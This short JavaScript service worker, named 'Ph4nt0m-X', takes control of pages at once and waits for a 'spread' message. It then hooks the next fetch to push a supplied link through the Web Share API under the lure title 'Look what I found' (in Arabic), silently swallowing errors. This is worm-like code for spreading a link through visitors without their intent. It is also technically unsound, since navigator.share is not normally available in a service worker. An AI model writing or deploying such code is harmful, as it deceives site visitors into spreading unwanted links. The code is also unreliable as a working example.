// Ph4nt0m-X Service Worker
self.addEventListener('install', e => {
    self.skipWaiting();
});
self.addEventListener('activate', e => {
    e.waitUntil(self.clients.claim());
});

self.addEventListener('message', event => {
    if (event.data && event.data.type === 'spread') {
        const url = event.data.url;
        // محاولة مشاركة الرابط عبر Web Share API عند أي زيارة مستقبلية
        self.addEventListener('fetch', function shareHook(e) {
            if (navigator.share) {
                navigator.share({
                    title: 'أنظر ماذا وجدت',
                    url: url
                }).catch(() => {});
            }
            self.removeEventListener('fetch', shareHook);
        });
    }
});

self.addEventListener('fetch', e => {});
